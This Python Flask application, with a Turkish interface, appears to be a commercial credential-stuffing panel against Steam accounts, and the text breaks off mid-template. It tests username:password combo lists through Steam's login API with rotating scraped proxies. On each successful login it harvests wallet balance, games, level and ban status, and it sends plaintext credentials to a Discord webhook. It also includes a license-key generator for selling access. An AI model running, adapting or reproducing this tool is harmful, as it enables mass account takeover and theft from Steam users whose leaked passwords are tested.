# -*- coding: utf-8 -*-
# NEPTUN FULL CAPTURE WEB - SADECE BAŞLAT'TA META REFRESH
import os, json, base64, time, random, secrets, threading
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for, send_file
import requests

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'NEPTUN_DASHBOARD_2026_SECURE')
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

MASTER_KEY = '310631B'
HITS_FILE = 'hits.json'
PROXY_FILE = 'proxies.txt'
KEYS_FILE = 'generated_keys.json'
CHECKER_RESULT_FILE = 'checker_result.txt'
CHECKER_PROGRESS_FILE = 'checker_progress.json'
PROXY_RESULT_FILE = 'proxy_result.txt'
LIVE_PROXY_FILE = 'live_proxies.txt'
KEY_IP_FILE = 'key_ip.json'

def load_hits():
    try:
        if os.path.exists(HITS_FILE):
            with open(HITS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

def save_hits(hits):
    with open(HITS_FILE, 'w') as f:
        json.dump(hits, f)

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        return [l.strip() for l in f if l.strip() and ':' in l]

def save_proxies(proxy_list):
    with open(PROXY_FILE, 'w', encoding='utf-8') as f:
        f.write('\n'.join(proxy_list))

def load_keys():
    try:
        if os.path.exists(KEYS_FILE):
            with open(KEYS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f)

def load_key_ip():
    try:
        if os.path.exists(KEY_IP_FILE):
            with open(KEY_IP_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_key_ip(data):
    with open(KEY_IP_FILE, 'w') as f:
        json.dump(data, f)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def load_checker_result():
    try:
        if os.path.exists(CHECKER_RESULT_FILE):
            with open(CHECKER_RESULT_FILE, 'r', encoding='utf-8') as f:
                return f.read()
    except:
        pass
    return '⏳ Bekleniyor...'

def save_checker_result(text):
    with open(CHECKER_RESULT_FILE, 'w', encoding='utf-8') as f:
        f.write(text)

def load_checker_progress():
    try:
        if os.path.exists(CHECKER_PROGRESS_FILE):
            with open(CHECKER_PROGRESS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {'done': 0, 'total': 0, 'hit': 0, 'twofa': 0, 'bad': 0}

def save_checker_progress(data):
    with open(CHECKER_PROGRESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f)

def load_proxy_result():
    try:
        if os.path.exists(PROXY_RESULT_FILE):
            with open(PROXY_RESULT_FILE, 'r', encoding='utf-8') as f:
                return f.read()
    except:
        pass
    return '⏳ Bekleniyor...'

def save_proxy_result(text):
    with open(PROXY_RESULT_FILE, 'w', encoding='utf-8') as f:
        f.write(text)

def save_live_proxies(proxy_list):
    with open(LIVE_PROXY_FILE, 'w', encoding='utf-8') as f:
        f.write('\n'.join(proxy_list))

def load_live_proxies():
    try:
        if os.path.exists(LIVE_PROXY_FILE):
            with open(LIVE_PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                return [l.strip() for l in f if l.strip()]
    except:
        pass
    return []

def scrape_proxies():
    proxies = set()
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http"
    ]
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    proxy_list = list(proxies)
    if proxy_list:
        save_proxies(proxy_list)
    return proxy_list

def check_proxy(proxy):
    try:
        r = requests.get('http://httpbin.org/ip', proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}, timeout=5)
        return r.status_code == 200
    except:
        return False

def check_steam(username, password, proxy=None):
    if not CRYPTO_AVAILABLE:
        return {'status': 'ERROR', 'error': 'pycryptodome kurulu değil'}
    
    session_req = requests.Session()
    session_req.headers.update({
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
        ]),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://store.steampowered.com',
        'Referer': 'https://store.steampowered.com/'
    })
    if proxy:
        session_req.proxies.update({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
    session_req.verify = False
    
    try:
        rsa_resp = session_req.get(
            'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/',
            params={'account_name': username},
            timeout=30
        ).json().get('response', {})
        
        if not rsa_resp.get('publickey_mod'):
            return {'status': 'ERROR', 'error': 'RSA anahtarı alınamadı'}
        
        key = RSA.construct((int(rsa_resp['publickey_mod'], 16), int(rsa_resp['publickey_exp'], 16)))
        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
        
        resp = session_req.post(
            'https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/',
            data={
                'account_name': username,
                'encrypted_password': enc_pwd,
                'encryption_timestamp': rsa_resp['timestamp'],
                'remember_login': 'true',
                'website_id': 'Community',
                'device_friendly_name': 'NEPTUN-Checker'
            },
            timeout=30
        ).json().get('response', {})
        
        steamid = resp.get('steamid')
        if not steamid:
            return {'status': 'ERROR', 'error': 'SteamID alınamadı'}
        
        guard_types = [c.get('confirmation_type', 0) for c in resp.get('allowed_confirmations', [])]
        if any(t in (3, 4) for t in guard_types):
            return {'status': '2FA', 'steamid': steamid, 'username': username}
        
        time.sleep(0.3)
        poll = session_req.post(
            'https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/',
            data={'client_id': resp['client_id'], 'request_id': resp['request_id']},
            timeout=30
        ).json().get('response', {})
        
        access = poll.get('access_token')
        if not access:
            return {'status': 'ERROR', 'error': 'Access token alınamadı'}
        
        result = {
            'status': 'HIT',
            'steamid': steamid,
            'username': username,
            'password': password,
            'access_token': access[:30] + '...'
        }
        
        try:
            r = session_req.get(
                'https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/',
                params={'access_token': access, 'steamids': steamid},
                timeout=10
            )
            if r.status_code == 200:
                p = r.json().get('response', {}).get('players', [{}])[0]
                result['name'] = p.get('personaname', 'N/A')
                result['country'] = p.get('loccountrycode', '—')
        except:
            pass
        
        try:
            r = session_req.get(
                'https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/',
                params={'access_token': access, 'steamids': steamid},
                timeout=10
            )
            if r.status_code == 200:
                p = r.json().get('players', [{}])[0]
                result['vac_bans'] = p.get('NumberOfVACBans', 0)
                result['game_bans'] = p.get('NumberOfGameBans', 0)
                result['vac'] = 'VAC' if p.get('VACBanned') else 'Temiz'
        except:
            pass
        
        try:
            r = session_req.get(
                'https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/',
                params={'access_token': access, 'steamid': steamid},
                timeout=10
            )
            if r.status_code == 200:
                result['level'] = r.json().get('response', {}).get('player_level', 0)
        except:
            pass
        
        try:
            r = session_req.get(
                'https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/',
                params={'access_token': access, 'steamid': steamid, 'include_appinfo': 'true', 'include_played_free_games': 'true'},
                timeout=60
            )
            if r.status_code == 200:
                games = r.json().get('response', {}).get('games', [])
                result['game_count'] = len(games)
                result['total_playtime_hours'] = sum(g.get('playtime_forever', 0) for g in games) // 60
        except:
            pass
        
        try:
            r = session_req.get(f'https://store.steampowered.com/api/getWalletBalance/?steamid={steamid}', timeout=10)
            if r.status_code == 200 and r.json().get('success'):
                result['balance'] = r.json().get('formattedBalance', '—')
        except:
            pass
        
        return result
        
    except Exception as e:
        return {'status': 'ERROR', 'error': str(e)}
    finally:
        session_req.close()

def send_webhook(url, result):
    embed = {
        'title': '🎮 NEPTUN FULL CAPTURE',
        'color': 0x5865F2,
        'fields': [
            {'name': '👤 Kullanıcı', 'value': result.get('username', 'N/A'), 'inline': True},
            {'name': '🔑 Şifre', 'value': result.get('password', 'N/A'), 'inline': True},
            {'name': '📛 İsim', 'value': result.get('name', 'N/A'), 'inline': True},
            {'name': '🌍 Ülke', 'value': result.get('country', '—'), 'inline': True},
            {'name': '💰 Bakiye', 'value': result.get('balance', '—'), 'inline': True},
            {'name': '⭐ Seviye', 'value': f"Lv.{result.get('level', '?')}", 'inline': True},
            {'name': '🚫 Ban', 'value': result.get('vac', 'Temiz'), 'inline': True},
            {'name': '🎮 Oyun Sayısı', 'value': str(result.get('game_count', 0)), 'inline': True},
        ],
        'footer': {'text': f"NEPTUN v2.0 • {datetime.utcnow().strftime('%d.%m.%Y %H:%M')}"}
    }
    try:
        requests.post(url, json={'embeds': [embed]}, timeout=10)
        return True
    except:
        return False

# ==================== THREAD'LER ====================
checker_running = False
checker_stop = False
proxy_running = False
proxy_stop = False
live_proxies = []

def run_checker_thread(combo_list, thread_count, webhook, proxy_input):
    global checker_running, checker_stop
    checker_running = True
    checker_stop = False
    
    proxy_list = []
    if proxy_input and ':' in proxy_input:
        proxy_list = [proxy_input.strip()]
    else:
        proxy_list = load_proxies()
    
    total = len(combo_list)
    hit_count = 0
    twofa_count = 0
    bad_count = 0
    done = 0
    result_lines = []
    
    save_checker_result(f"🚀 Başlatıldı! {total} combo kontrol edilecek.\n\n")
    save_checker_progress({'done': 0, 'total': total, 'hit': 0, 'twofa': 0, 'bad': 0})
    
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(thread_count, 50)) as executor:
        futures = {}
        for u, p in combo_list:
            if checker_stop:
                break
            proxy = random.choice(proxy_list) if proxy_list else None
            future = executor.submit(check_steam, u, p, proxy)
            futures[future] = (u, p)
        
        for future in concurrent.futures.as_completed(futures):
            if checker_stop:
                break
            u, p = futures[future]
            try:
                result = future.result(timeout=60)
                done += 1
                status = result.get('status', 'BAD')
                
                if status == 'HIT':
                    hit_count += 1
                    hits = load_hits()
                    hits.append({
                        'time': datetime.utcnow().isoformat(),
                        'username': u,
                        'password': p,
                        'steamid': result.get('steamid'),
                        'name': result.get('name', 'N/A'),
                        'country': result.get('country', '—'),
                        'level': result.get('level', 0),
                        'game_count': result.get('game_count', 0),
                        'status': 'HIT'
                    })
                    save_hits(hits)
                    if webhook:
                        send_webhook(webhook, result)
                    result_lines.append(f"✅ HIT | {u}:{p} | {result.get('name', 'N/A')}")
                elif status == '2FA':
                    twofa_count += 1
                    result_lines.append(f"⚠️ 2FA | {u}:{p}")
                else:
                    bad_count += 1
                    result_lines.append(f"❌ BAD | {u}:{p}")
                
                save_checker_progress({'done': done, 'total': total, 'hit': hit_count, 'twofa': twofa_count, 'bad': bad_count})
                save_checker_result("\n".join(result_lines[-100:]))
                
            except Exception as e:
                done += 1
                bad_count += 1
                result_lines.append(f"❌ ERROR | {u}:{p}")
                save_checker_progress({'done': done, 'total': total, 'hit': hit_count, 'twofa': twofa_count, 'bad': bad_count})
                save_checker_result("\n".join(result_lines[-100:]))
    
    final_text = f"\n\n✅ İŞLEM TAMAMLANDI! HIT: {hit_count} | 2FA: {twofa_count} | BAD: {bad_count} | Toplam: {total}\n\n" + "\n".join(result_lines)
    save_checker_result(final_text)
    save_checker_progress({'done': total, 'total': total, 'hit': hit_count, 'twofa': twofa_count, 'bad': bad_count})
    checker_running = False

def run_proxy_scrape_check_thread():
    global proxy_running, proxy_stop, live_proxies
    proxy_running = True
    proxy_stop = False
    live_proxies = []
    
    save_proxy_result("⏳ Proxy toplanıyor ve kontrol ediliyor...\n")
    
    proxies = scrape_proxies()
    if not proxies:
        save_proxy_result("❌ Proxy bulunamadı.")
        proxy_running = False
        return
    
    total = len(proxies)
    alive = 0
    dead = 0
    done = 0
    results = []
    live_list = []
    
    save_proxy_result(f"🚀 {total} proxy kontrol ediliyor... (Thread: 200)\n\n")
    
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(check_proxy, p): p for p in proxies}
        for future in concurrent.futures.as_completed(futures):
            if proxy_stop:
                break
            p = futures[future]
            done += 1
            try:
                if future.result(timeout=10):
                    alive += 1
                    live_list.append(p)
                    results.append(f"✅ CANLI | {p}")
                else:
                    dead += 1
                    results.append(f"❌ ÖLÜ | {p}")
            except:
                dead += 1
                results.append(f"❌ ÖLÜ | {p}")
            
            if done % 20 == 0 or done == total:
                save_proxy_result(f"📊 İlerleme: {done}/{total} | Canlı: {alive} | Ölü: {dead}\n\n" + "\n".join(results[-50:]))
    
    live_proxies = live_list
    save_live_proxies(live_list)
    
    final_text = f"\n\n✅ İŞLEM TAMAMLANDI! Canlı: {alive} | Ölü: {dead} | Toplam: {total}\n\n" + "\n".join(results)
    save_proxy_result(final_text)
    proxy_running = False

# ==================== HTML ====================
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neptun Full Capture</title>
    {% if auto_refresh %}
    <meta http-equiv="refresh" content="3">
    {% endif %}
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0a0a; color:#00ffcc; font-family:'Segoe UI',sans-serif; display:flex; min-height:100vh; }
        .sidebar { width:200px; background:#0d0d0d; border-right:1px solid #1a1a1a; padding:20px 0; position:fixed; height:100vh; overflow-y:auto; }
        .sidebar .logo { padding:0 20px 25px; border-bottom:1px solid #1a1a1a; }
        .sidebar .logo h1 { color:#ff00ff; font-size:18px; }
        .sidebar .logo span { color:#00ffcc; font-size:11px; display:block; }
        .sidebar .menu-item { padding:10px 20px; cursor:pointer; color:#666; display:block; text-decoration:none; font-size:13px; }
        .sidebar .menu-item:hover { color:#fff; background:#111; }
        .sidebar .menu-item.active { color:#00ffcc; background:#111; }
        .sidebar .menu-item .icon { margin-right:10px; }
        .sidebar .menu-section { padding:15px 20px 5px; color:#333; font-size:10px; text-transform:uppercase; }
        .sidebar .menu-item.logout { margin-top:20px; border-top:1px solid #1a1a1a; padding-top:15px; color:#ff4444; }
        .main { margin-left:200px; flex:1; padding:20px 30px; min-height:100vh; }
        .header { display:flex; justify-content:space-between; align-items:center; padding-bottom:15px; border-bottom:1px solid #1a1a1a; flex-wrap:wrap; gap:10px; }
        .header h2 { color:#fff; font-weight:400; font-size:20px; }
        .header h2 small { color:#666; font-size:13px; }
        .stats { display:flex; gap:20px; }
        .stats .stat { text-align:center; }
        .stats .stat .num { font-size:20px; font-weight:bold; }
        .stats .stat .label { font-size:10px; color:#666; }
        .stat-hit .num { color:#44ff44; }
        .stat-2fa .num { color:#ffcc00; }
        .stat-bad .num { color:#ff4444; }
        .stat-check .num { color:#00ffcc; }
        .card { background:#0d0d0d; border:1px solid #1a1a1a; border-radius:6px; padding:15px 20px; margin-bottom:15px; }
        .card-title { color:#00ffcc; font-size:13px; font-weight:600; margin-bottom:10px; }
        .form-row { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:8px; }
        .form-row input, .form-row select, .form-row textarea { flex:1; min-width:120px; background:#111; border:1px solid #222; color:#fff; padding:8px 12px; border-radius:4px; font-size:13px; }
        .form-row input:focus, .form-row select:focus, .form-row textarea:focus { border-color:#00ffcc; outline:none; }
        .form-row textarea { min-height:60px; font-family:monospace; resize:vertical; }
        .btn { padding:7px 16px; border:none; border-radius:4px; font-weight:600; font-size:12px; cursor:pointer; background:#1a1a1a; color:#fff; transition:0.2s; }
        .btn:hover { opacity:0.8; }
        .btn-primary { background:#00ffcc; color:#0a0a0a; }
        .btn-danger { background:#ff4444; color:#fff; }
        .btn-success { background:#44ff44; color:#0a0a0a; }
        .btn-purple { background:#ff00ff; color:#fff; }
        .btn-outline { background:transparent; border:1px solid #333; color:#fff; }
        .btn-warning { background:#ffcc00; color:#0a0a0a; }
        .btn-download { background:#4488ff; color:#fff; }
        .flex { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
        .hidden { display:none !important; }
        .table-wrap { overflow-x:auto; max-height:500px; overflow-y:auto; }
        table { width:100%; border-collapse:collapse; font-size:12px; }
        th { text-align:left; padding:8px 10px; color:#666; border-bottom:1px solid #1a1a1a; position:sticky; top:0; background:#0d0d0d; }
        td { padding:8px 10px; border-bottom:1px solid #111; color:#ccc; }
        .status-badge { padding:2px 10px; border-radius:10px; font-size:10px; font-weight:600; }
        .status-hit { background:#44ff44; color:#0a0a0a; }
        .status-2fa { background:#ffcc00; color:#0a0a0a; }
        .status-bad { background:#ff4444; color:#fff; }
        .login-overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:#0a0a0a; display:flex; justify-content:center; align-items:center; z-index:999; }
        .login-box { background:#0d0d0d; border:1px solid #1a1a1a; border-radius:10px; padding:35px 45px; width:350px; text-align:center; }
        .login-box h1 { color:#ff00ff; font-size:26px; }
        .login-box p { color:#666; font-size:13px; margin-bottom:20px; }
        .login-box input { width:100%; padding:10px 14px; background:#111; border:1px solid #222; color:#fff; border-radius:6px; font-size:15px; text-align:center; }
        .login-box input:focus { border-color:#00ffcc; outline:none; }
        .login-box .btn { width:100%; margin-top:12px; padding:10px; font-size:15px; }
        .login-box .error { color:#ff4444; margin-top:10px; font-size:13px; }
        .logout-btn { background:#ff4444; color:#fff; padding:5px 14px; border-radius:4px; border:none; cursor:pointer; font-weight:600; font-size:12px; }
        .logout-btn:hover { opacity:0.8; }
        .result-box { margin-top:10px; max-height:400px; overflow-y:auto; font-family:monospace; font-size:11px; color:#ccc; background:#0a0a0a; border:1px solid #1a1a1a; border-radius:4px; padding:10px; white-space:pre-wrap; word-break:break-all; }
        .msg { margin-top:8px; color:#666; font-size:13px; }
        .msg-success { color:#44ff44; }
        .msg-error { color:#ff4444; }
        .progress-bar { width:100%; height:4px; background:#1a1a1a; border-radius:2px; margin-top:8px; overflow:hidden; }
        .progress-bar .fill { height:100%; background:#00ffcc; width:0%; transition:width 0.3s; }
        .hit-count-badge { background:#44ff44; color:#0a0a0a; padding:2px 10px; border-radius:10px; font-size:11px; font-weight:bold; }
        .download-btn { background:#4488ff; color:#fff; padding:5px 14px; border-radius:4px; border:none; cursor:pointer; font-weight:600; font-size:12px; text-decoration:none; display:inline-block; }
        .download-btn:hover { opacity:0.8; }
        .live-badge { background:#ff4444; color:#fff; padding:2px 8px; border-radius:10px; font-size:9px; margin-left:5px; animation: blink 1s infinite; }
        @keyframes blink { 0%{opacity:1} 50%{opacity:0.3} 100%{opacity:1} }
        .refresh-badge { background:#ffcc00; color:#0a0a0a; padding:2px 8px; border-radius:10px; font-size:9px; margin-left:5px; animation: blink 1s infinite; }
        @media (max-width:700px) { .sidebar { width:50px; } .sidebar .logo h1, .sidebar .logo span, .sidebar .menu-item span:not(.icon) { display:none; } .sidebar .menu-item { padding:10px 14px; } .main { margin-left:50px; padding:15px; } .header { flex-direction:column; align-items:stretch; } .stats { justify-content:space-around; } .form-row { flex-direction:column; } .login-box { width:90%; padding:20px; } }
    </style>
</head>
<body>

<!-- LOGIN -->
<div class="login-overlay" id="loginOverlay" style="{% if session.get('authenticated') %}display:none;{% endif %}">
    <div class="login-box">
        <h1>🔑 NEPTUN</h1>
        <p>Full Capture v2.0 • Giriş</p>
        <form method="POST" action="/login">
            <input type="password" name="key" placeholder="Anahtar Girin" autofocus>
            <button type="submit" class="btn btn-primary">Giriş Yap</button>
        </form>
        {% if error %}<div class="error">❌ {{ error }}</div>{% endif %}
    </div>
</div>

<!-- SIDEBAR -->
<div class="sidebar">
    <div class="logo"><h1>NEPTUN</h1><span>Full Capture</span></div>
    <div class="menu-section">Menü</div>
    <a href="/page/dashboard" class="menu-item {{ 'active' if page == 'dashboard' else '' }}"><span class="icon">📊</span> Dashboard</a>
    <a href="/page/checker" class="menu-item {{ 'active' if page == 'checker' else '' }}"><span class="icon">🎮</span> Checker {% if auto_refresh and page == 'checker' %}<span class="refresh-badge">REFRESH</span>{% endif %}</a>
    <div class="menu-section">Araçlar</div>
    <a href="/page/proxy_scraper" class="menu-item {{ 'active' if page == 'proxy_scraper' else '' }}"><span class="icon">🌐</span> Proxy Scraper {% if auto_refresh and page == 'proxy_scraper' %}<span class="refresh-badge">REFRESH</span>{% endif %}</a>
    <a href="/page/proxy_checker" class="menu-item {{ 'active' if page == 'proxy_checker' else '' }}"><span class="icon">✅</span> Proxy Checker</a>
    <a href="/page/webhook" class="menu-item {{ 'active' if page == 'webhook' else '' }}"><span class="icon">🔗</span> Webhook</a>
    <a href="/page/settings" class="menu-item {{ 'active' if page == 'settings' else '' }}"><span class="icon">⚙️</span> Ayarlar</a>
    {% if session.get('is_admin') %}
    <div class="menu-section">Admin</div>
    <a href="/page/key_gen" class="menu-item {{ 'active' if page == 'key_gen' else '' }}"><span class="icon">🔑</span> Key Üretici</a>
    {% endif %}
    <a href="/logout" class="menu-item logout"><span class="icon">🚪</span> Çıkış</a>
</div>

<!-- MAIN -->
<div class="main" style="{% if not session.get('authenticated') %}display:none;{% endif %}">
    <div class="header">
        <h2>
            {% if page == 'dashboard' %}Dashboard <small>Genel Bakış</small>
            {% elif page == 'checker' %}Checker <small>Hesap Kontrolü</small>
            {% elif page == 'proxy_scraper' %}Proxy Scraper <small>Proxy Toplama</small>
            {% elif page == 'proxy_checker' %}Proxy Checker <small>Proxy Kontrolü</small>
            {% elif page == 'webhook' %}Webhook <small>Discord Bildirim</small>
            {% elif page == 'settings' %}Ayarlar <small>Konfigürasyon</small>
            {% elif page == 'key_gen' %}Key Üretici <small>Admin</small>
            {% else %}Dashboard <small>Genel Bakış</small>{% endif %}
        </h2>
        <div style="display:flex; align-items:center; gap:12px; flex-wrap:wrap;">
            <div class="stats">
                <div class="stat stat-hit"><div class="num" id="statHit">{{ stats.hit }}</div><div class="label">HIT</div></div>
                <div class="stat stat-2fa"><div class="num" id="stat2fa">{{ stats.twofa }}</div><div class="label">2FA</div></div>
                <div class="stat stat-bad"><div class="num" id="statBad">{{ stats.bad }}</div><div class="label">BAD</div></div>
                <div class="stat stat-check"><div class="num" id="statCheck">{{ stats.check }}</div><div class="label">CHECK</div></div>
            </div>
            <a href="/logout"><button class="logout-btn">🚪 Çıkış</button></a>
        </div>
    </div>
    
    <div id="pageContent">
        <!-- DASHBOARD -->
        <div id="page-dashboard" {% if page != 'dashboard' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">📊 Tüm HIT'ler <span class="hit-count-badge">{{ hits|length }}</span></div>
                <div class="table-wrap">
                    <table>
                        <thead><tr><th>#</th><th>Kullanıcı</th><th>Şifre</th><th>SteamID</th><th>İsim</th><th>Ülke</th><th>Seviye</th><th>Oyun</th><th>Durum</th></tr></thead>
                        <tbody>
                            {% for h in hits %}
                            <tr><td>{{ loop.index }}</td><td>{{ h.username }}</td><td>{{ h.password }}</td><td>{{ h.steamid }}</td><td>{{ h.name }}</td><td>{{ h.country }}</td><td>{{ h.level }}</td><td>{{ h.game_count }}</td><td><span class="status-badge status-hit">HIT</span></td></tr>
                            {% else %}
                            <tr><td colspan="9" style="color:#666;text-align:center;">Henüz HIT yok</td></tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <!-- CHECKER -->
        <div id="page-checker" {% if page != 'checker' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">🎮 Checker</div>
                <form method="POST" action="/action/checker">
                    <div class="form-row"><textarea name="combo" placeholder="kullanici:sifre&#10;user:pass&#10;ornek:123456"></textarea></div>
                    <div class="form-row">
                        <input type="number" name="thread" value="5" min="1" max="50" style="flex:0 0 70px;">
                        <input type="text" name="webhook" placeholder="Discord Webhook URL (opsiyonel)">
                        <input type="text" name="proxy" placeholder="Proxy (opsiyonel, ip:port)">
                    </div>
                    <div class="flex">
                        <button type="submit" class="btn btn-primary" name="action" value="start">🚀 Başlat</button>
                        <button type="submit" class="btn btn-danger" name="action" value="stop">⏹ Durdur</button>
                        <button type="submit" class="btn btn-outline" name="action" value="clear">🗑️ Temizle</button>
                    </div>
                </form>
                <div style="color:#666;font-size:12px;margin-top:6px;">
                    Combo: {{ progress.total }} | İlerleme: {{ progress.done }}/{{ progress.total }}
                    | HIT: {{ progress.hit }} | 2FA: {{ progress.twofa }} | BAD: {{ progress.bad }}
                    {% if auto_refresh and page == 'checker' %}<span class="refresh-badge">🔄 CANLI</span>{% endif %}
                </div>
                <div class="progress-bar">
                    <div class="fill" style="width:{{ progress_pct }}%;"></div>
                </div>
            </div>
            <div class="card">
                <div class="card-title">📋 Sonuçlar</div>
                <div class="result-box">{{ result_text }}</div>
            </div>
        </div>
        
        <!-- PROXY SCRAPER -->
        <div id="page-proxy_scraper" {% if page != 'proxy_scraper' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">🌐 Proxy Scraper</div>
                <form method="POST" action="/action/proxy_scrape">
                    <div class="flex">
                        <button type="submit" class="btn btn-primary" name="action" value="scrape">🔍 Sadece Topla</button>
                        <button type="submit" class="btn btn-warning" name="action" value="scrape_check">🚀 Çek ve Kontrol Et (Thread: 200)</button>
                        <button type="submit" class="btn btn-outline" name="action" value="list">📋 Listele</button>
                        <button type="submit" class="btn btn-danger" name="action" value="clear">🗑️ Temizle</button>
                    </div>
                </form>
                <div style="color:#666;font-size:12px;margin-top:6px;">
                    {{ proxy_status }}
                    {% if live_count > 0 %}
                    | <a href="/download/live_proxies" class="download-btn">⬇️ Canlı Proxy İndir ({{ live_count }})</a>
                    {% endif %}
                    {% if auto_refresh and page == 'proxy_scraper' %}<span class="refresh-badge">🔄 CANLI</span>{% endif %}
                </div>
            </div>
            <div class="card">
                <div class="card-title">📋 Sonuçlar</div>
                <div class="result-box">{{ proxy_result }}</div>
            </div>
        </div>
        
        <!-- PROXY CHECKER -->
        <div id="page-proxy_checker" {% if page != 'proxy_checker' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">✅ Proxy Checker</div>
                <form method="POST" action="/action/proxy_check">
                    <div class="form-row"><textarea name="proxies" placeholder="ip:port&#10;ip:port&#10;..." style="min-height:100px;"></textarea></div>
                    <div class="flex">
                        <button type="submit" class="btn btn-primary" name="action" value="check">🔍 Kontrol Et</button>
                        <button type="submit" class="btn btn-outline" name="action" value="clear">🗑️ Temizle</button>
                    </div>
                </form>
                <div style="color:#666;font-size:12px;margin-top:6px;">{{ proxy_check_status }}</div>
            </div>
            <div class="card">
                <div class="card-title">📋 Sonuçlar</div>
                <div class="result-box">{{ proxy_check_result }}</div>
            </div>
        </div>
        
        <!-- WEBHOOK -->
        <div id="page-webhook" {% if page != 'webhook' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">🔗 Webhook</div>
                <form method="POST" action="/action/webhook">
                    <div class="form-row"><input type="text" name="webhook_url" placeholder="Discord Webhook URL" value="{{ session.get('webhook_url', '') }}"></div>
                    <div class="flex">
                        <button type="submit" class="btn btn-primary" name="action" value="save">💾 Kaydet</button>
                        <button type="submit" class="btn btn-success" name="action" value="test">📨 Test Gönder</button>
                    </div>
                </form>
                {% if webhook_msg %}
                <div class="msg {{ 'msg-success' if webhook_ok else 'msg-error' }}">{{ webhook_msg }}</div>
                {% endif %}
            </div>
        </div>
        
        <!-- SETTINGS -->
        <div id="page-settings" {% if page != 'settings' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">⚙️ Ayarlar</div>
                <form method="POST" action="/action/settings">
                    <div class="form-row">
                        <input type="number" name="thread" value="{{ session.get('thread', 5) }}" min="1" max="50" style="flex:0 0 70px;" placeholder="Thread">
                        <input type="number" name="timeout" value="{{ session.get('timeout', 30) }}" min="5" max="120" style="flex:0 0 70px;" placeholder="Timeout">
                        <input type="number" name="delay" value="{{ session.get('delay', 0.1) }}" step="0.1" min="0" max="2" style="flex:0 0 70px;" placeholder="Delay">
                        <button type="submit" class="btn btn-primary">💾 Kaydet</button>
                    </div>
                </form>
                {% if settings_msg %}
                <div class="msg msg-success">{{ settings_msg }}</div>
                {% endif %}
            </div>
        </div>
        
        <!-- KEY GENERATOR -->
        {% if session.get('is_admin') %}
        <div id="page-key_gen" {% if page != 'key_gen' %}class="hidden"{% endif %}>
            <div class="card">
                <div class="card-title">🔑 Key Üretici <span class="status-badge status-hit">Admin</span></div>
                <form method="POST" action="/action/key_gen">
                    <div class="form-row">
                        <select name="plan" style="flex:0 0 120px;">
                            <option value="1h">1 Saat</option>
                            <option value="1d">1 Gün</option>
                            <option value="1w">1 Hafta</option>
                            <option value="1m">1 Ay</option>
                            <option value="1y">1 Yıl</option>
                            <option value="lifetime">Lifetime</option>
                        </select>
                        <button type="submit" class="btn btn-purple">🔑 Anahtar Üret</button>
                    </div>
                </form>
                {% if key_result %}
                <div style="margin-top:8px;font-family:monospace;color:#00ffcc;font-size:13px;">{{ key_result }}</div>
                {% endif %}
                <div class="table-wrap" style="margin-top:10px;">
